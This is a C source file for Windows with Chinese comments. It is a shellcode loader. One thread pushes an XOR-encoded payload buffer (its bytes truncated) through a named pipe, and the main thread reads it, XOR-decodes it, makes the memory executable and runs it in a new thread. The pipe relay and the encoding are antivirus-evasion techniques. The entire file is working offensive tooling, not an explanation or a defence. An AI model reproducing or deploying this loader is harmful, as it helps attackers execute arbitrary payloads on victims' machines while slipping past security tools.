#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#define BUFF_SIZE 1024
char buf[] = "\xf6\x42\x89\xee\...";
// 匿名管道的名称
PTCHAR ptsPipeName = TEXT("\\\\.\\pipe\\BadCodeTest");  

BOOL RecvShellcode(VOID) {
    // 客户端的句柄
    HANDLE hPipeClient;
    // 写入长度
    DWORD dwWritten;
    // Shellcode的长度
    DWORD dwShellcodeSize = sizeof(buf);
    // 等待管道可用，等待\\\\.\\pipe\\BadCodeTest有信号
    WaitNamedPipe(ptsPipeName, NMPWAIT_WAIT_FOREVER);
    // 连接管道，然后请求对文件的写入，客户端只读取，安全描述为为NULL，打开文件或设备，文件没有其他属性，没有句柄
    hPipeClient = CreateFile(ptsPipeName, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // 判断是否失败，失败的返回值是INVALID_HANDLE_VALUE
    if (hPipeClient == INVALID_HANDLE_VALUE) {
        printf("[+]Can't Open Pipe , Error : %d \n", GetLastError());
        return FALSE;
    }

    // WriteFile写入文件，写入到管道里
    WriteFile(hPipeClient, buf, dwShellcodeSize, &dwWritten, NULL);
    if (dwWritten == dwShellcodeSize) {
        CloseHandle(hPipeClient);
        printf("[+]Send Success ! Shellcode : %d Bytes\n", dwShellcodeSize);
        return TRUE;
    }
    // 如果不成功，关掉句柄 返回失败
    CloseHandle(hPipeClient);
    return FALSE;
}


int wmain(int argc, TCHAR* argv[]) {

    HANDLE hPipe;               // 匿名管道的句柄
    DWORD dwError;              // Error的接收值
    CHAR szBuffer[BUFF_SIZE];   // Buff大小
    DWORD dwLen;                // 读取字节数变量的指针
    PCHAR pszShellcode = NULL;  // shellcode
    DWORD dwOldProtect;         // 内存页属性
    HANDLE hThread;             // 线程句柄
    DWORD dwThreadId;           // 线程ID
    // 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea
    hPipe = CreateNamedPipe(
        ptsPipeName,
        PIPE_ACCESS_INBOUND,            // 管道中的数据流仅从客户端到服务器
        PIPE_TYPE_BYTE | PIPE_WAIT,     // PIPE_TYPE_BYTE：数据作为字节流写入管道，PIPE_WAIT：阻塞模式启用，等到有数据要读取、所有数据都已写入或客户端已连接时，操作才会完成
        PIPE_UNLIMITED_INSTANCES,       // PIPE_UNLIMITED_INSTANCES也就是最大的255
        BUFF_SIZE,
        BUFF_SIZE,
        0,
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        dwError = GetLastError();
        printf("[-]Create Pipe Error : %d \n", dwError);
        return dwError;
    }

    // 创建一个写入shellcode的线程
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RecvShellcode, NULL, NULL, NULL);

    if (ConnectNamedPipe(hPipe, NULL) > 0) {
        printf("[+]Client Connected...\n");
        // ReadFile读取文件，从hPipe读取到szBuffer里，最大数是1024
        ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
        printf("[+]Get DATA Length : %d \n", dwLen);
        // 申请内存页
        pszShellcode = (PCHAR)VirtualAlloc(NULL, dwLen, MEM_COMMIT, PAGE_READWRITE);
        // 拷贝内存
        CopyMemory(pszShellcode, szBuffer, dwLen);

        for (DWORD i = 0; i < dwLen; i++) {
            //Sleep(50);
            _InterlockedXor8(pszShellcode + i, 10);
        }

        // 这里开始更改它的属性为可执行
        VirtualProtect(pszShellcode, dwLen, PAGE_EXECUTE, &dwOldProtect);
        // 执行Shellcode
        hThread = CreateThread(
            NULL, // 安全描述符
            NULL, // 栈的大小
            (LPTHREAD_START_ROUTINE)pszShellcode, // 函数
            NULL, // 参数
            NULL, // 线程标志
            &dwThreadId // 线程ID
        );

        WaitForSingleObject(hThread, INFINITE);
    }

    return 0;
}